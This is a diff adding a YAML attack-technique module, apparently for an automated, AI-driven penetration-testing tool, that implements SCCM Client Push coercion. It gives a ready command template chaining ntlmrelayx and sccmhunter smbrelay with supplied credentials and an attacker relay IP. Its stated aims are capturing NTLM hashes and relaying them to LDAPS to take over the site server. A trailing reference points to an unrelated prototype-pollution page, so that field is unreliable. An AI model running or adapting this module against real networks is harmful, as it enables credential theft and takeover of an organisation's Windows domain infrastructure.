@@ -1,0 +1,38 @@
+name: sccm_client_push
+category: sccm
+description: SCCM Takeover-1 — coerce Client Push account NTLM via automatic install
+preconditions:
+- has_cred
+- sccm_site_code_found
+- client_push_enabled
+parameters:
+  site_server: from_engagement.site_server
+  attacker_ip: from_engagement.attacker_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+command_template: ntlmrelayx.py -t ldaps://{site_server} -smb2support & sccmhunter
+  smbrelay -u {username} -p '{password}' -d {domain} -tm {site_server} -rl {attacker_ip}
+parser: generic_parser
+expected_effects:
+- netntlmv2_hash_captured
+- sccm_client_push_coerced
+- has_hash
+falsifier:
+  pattern: client push disabled|ACCESS_DENIED|auth fallback disabled
+  timeout: 300
+model_tier: sonnet
+mechanism: 'If Automatic Client Push Install is on, SCCM tries to install its client
+  on any
+
+  discovered device, using its Client Push Installation Accounts (often local admin
+
+  on every workstation). Register a rogue device, wait for push, relay the NTLM auth
+
+  to LDAPS for RBCD or add-computer → site server takeover.
+
+  '
+references:
+  ocd_mindmap: 'Branch 12: SCCM Takeover-1 (Client Push coercion)'
+  hacktricks: windows-hardening/active-directory-methodology/pentesting-sccm.md
+hacktricks_ref: pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
